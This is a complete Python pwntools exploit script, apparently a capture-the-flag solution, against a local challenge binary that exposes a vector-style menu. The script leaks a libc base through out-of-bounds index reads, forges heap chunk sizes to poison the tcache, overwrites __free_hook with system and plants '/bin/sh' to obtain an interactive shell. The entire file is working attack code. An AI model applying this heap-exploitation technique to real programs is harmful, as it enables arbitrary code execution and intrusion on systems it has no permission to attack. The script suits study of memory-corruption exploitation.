from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)
sendline = lambda p, x: p.sendline(x)
send = lambda p, x: p.send(x)

filepath = './chall'
e = context.binary = ELF(filepath, checksec=False)
context.terminal = 'bash'
if args.REMOTE:
    p = remote('localhost', 7777)

else:
    p = process(filepath)
    # p = remote('localhost', 7777)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = [0xe3b2e, 0xe3b31, 0xe3b34]

def dbg(p):
    gdb.attach(p)
    pause()

def push_back(v):
    sendlineafter(p, b'>> ', b'1')
    sendlineafter(p, b'value: ', str(v).encode())

def pop_back():
    sendlineafter(p, b'>> ', b'2')

def store(i, v):
    sendlineafter(p, b'>> ', b'3')
    sendlineafter(p, b'index: ', str(i).encode())
    sendlineafter(p, b'value: ', str(v).encode())

def load(i):
    sendlineafter(p, b'>> ', b'4')
    sendlineafter(p, b'index: ', str(i).encode())
    p.recvuntil(b'value: ')
    return p.recvline()[:-1]

def wipe():
    sendlineafter(p, b'>> ', b'5')

def store_addr(i, addr):
    store(i, addr>>32)

    addr = addr & 0xffffffff
    if addr > 0x7fffffff:
        addr = ~(addr^0xffffffff)
    store(i-1, addr)

# Leak
for i in range(0x850//4):
    push_back(i)

libc.address = int(load(-516)) + (int(load(-515)) << 32) - 0x1ecbe0
print(hex(libc.address))
wipe()

# Alloc 0x50 chunk
for i in range(16):
    push_back(i)
store(-2, 0x31)         # 0x51 -> 0x31
# store(10, 0x50-0x30+1)  
# store(11, 0)

# Alloc 0x90 chunk
# Free 0x50 chunk -> put into 0x30 tcache
for i in range(16):
    push_back(i)
store_addr(-19, libc.symbols['__free_hook']-8)
wipe()

# Alloc 0x30 chunk
for i in range(8):
    push_back(i)
store(-2, 0x51)         # 0x31 -> 0x51
wipe()

# Alloc 0x20 chunk
for i in range(4):
    push_back(i)
store_addr(1, u64(b'/bin/sh\0'))
store_addr(3, libc.symbols['system'])

# Alloc 0x30 chunk and copy to __free_hook
push_back(0)

p.interactive()
